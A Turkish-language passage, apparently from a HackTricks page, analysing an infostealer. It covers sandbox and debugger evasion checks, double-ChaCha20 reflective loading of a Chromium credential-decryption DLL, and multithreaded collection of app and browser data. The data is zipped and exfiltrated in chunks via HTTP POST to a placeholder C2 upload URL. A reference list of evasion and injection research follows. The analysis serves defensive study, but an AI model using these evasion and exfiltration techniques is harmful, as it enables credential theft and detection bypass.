- A varyantı süreç listesini gezer, her adı özel bir rolling checksum ile hash'ler ve sonucu debugger/sandbox'lar için gömülü blocklist'lerle karşılaştırır; bilgisayar adı üzerinde checksum işlemini tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- B varyantı sistem özelliklerini inceler (süreç sayısı alt sınırı, yakın zamandaki çalışma süresi), VirtualBox additions'ı tespit etmek için `OpenServiceA("VBoxGuest")` çağrısı yapar ve tek adımlı yürütmeyi saptamak için beklemelerin çevresinde zamanlama kontrolleri gerçekleştirir. Herhangi bir eşleşme, modüller başlatılmadan önce işlemi durdurur.

### Fileless yardımcı + çift ChaCha20 reflective loading

- Birincil DLL/EXE, diske bırakılan veya belleğe manuel olarak eşlenen bir Chromium kimlik bilgisi yardımcısı içerir; fileless modda, yardımcı dosya kalıntısı bırakılmaması için import'ları/relocation'ları kendisi çözümler.
- Bu yardımcı, ikinci aşama bir DLL'yi ChaCha20 ile iki kez şifrelenmiş olarak saklar (iki adet 32 baytlık anahtar + 12 baytlık nonce). Her iki şifre çözme işleminden sonra blob'u reflectively yükler (`LoadLibrary` kullanmadan) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) üzerinden elde edilen `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export'larını çağırır.<sup>[[25]](#references)</sup>
- ChromElevator rutinleri, canlı bir Chromium tarayıcısına inject etmek, AppBound Encryption anahtarlarını devralmak ve ABE hardening'e rağmen SQLite veritabanlarından parolaları/çerezleri/kredi kartı bilgilerini doğrudan çözmek için direct-syscall reflective process hollowing kullanır.


### Modüler bellek içi toplama ve parçalı HTTP exfil

- `create_memory_based_log`, global `memory_generators` function-pointer tablosunu yineler ve etkin her modül için bir thread başlatır (Telegram, Discord, Steam, ekran görüntüleri, belgeler, tarayıcı eklentileri vb.). Her thread sonuçları paylaşılan buffer'lara yazar ve yaklaşık 45 saniyelik join süresinin ardından dosya sayısını bildirir.
- İşlem tamamlandığında her şey, statik olarak bağlanmış `miniz` kütüphanesiyle `%TEMP%\\Log.zip` olarak sıkıştırılır. Ardından `ThreadPayload1` 15 saniye bekler ve arşivi HTTP POST üzerinden 10 MB'lık parçalar halinde `http://<C2>:6767/upload` adresine aktarırken tarayıcıya ait bir `multipart/form-data` boundary'sini taklit eder (`----WebKitFormBoundary***`). Her parçaya `User-Agent: upload`, `auth: <build_id>` ve isteğe bağlı olarak `w: <campaign_tag>` eklenir; son parçaya ise C2'nin yeniden birleştirmenin tamamlandığını anlaması için `complete: true` eklenir.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset and thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Using EMBER2024 to evaluate red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Evading Machine Learning Based Detections](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML-based .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan method](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - 2CLoader technical analysis](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)

{{#include ../banners/hacktricks-training.md}}
